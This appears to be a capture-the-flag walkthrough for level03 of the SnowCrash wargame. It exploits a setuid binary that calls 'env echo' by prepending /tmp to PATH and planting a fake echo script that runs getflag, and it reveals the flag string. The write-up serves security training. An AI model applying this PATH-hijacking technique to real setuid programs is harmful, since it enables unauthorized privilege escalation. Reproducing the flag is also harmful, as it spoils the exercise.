### Level03

Once in the home of level03, we can see :

```
level03@SnowCrash:~$ ls -l
total 12
-rwsr-sr-x 1 flag03 level03 8627 Mar 5 2016 level03
level03@SnowCrash:~$ ./level03
Exploit me
```

If you look at ./level3 with strings you can see a call to echo :

> /usr/bin/env echo Exploit me

We can override the PATH variable to point to a directory with our custom version of echo and since echo is executed using env, it isn't treated as a built-in.

Having access to tmp I start by adding it in the path with the command: `PATH=/tmp:$PATH`.

Then I will create a new file containing the path of the getflag and I give it the rights: `echo "/bin/getflag" > /tmp/echo; chmod +x /tmp/echo`.

Now when I run `./level03` I get the flag `qi0maab88jaj46qoumi7maus`.
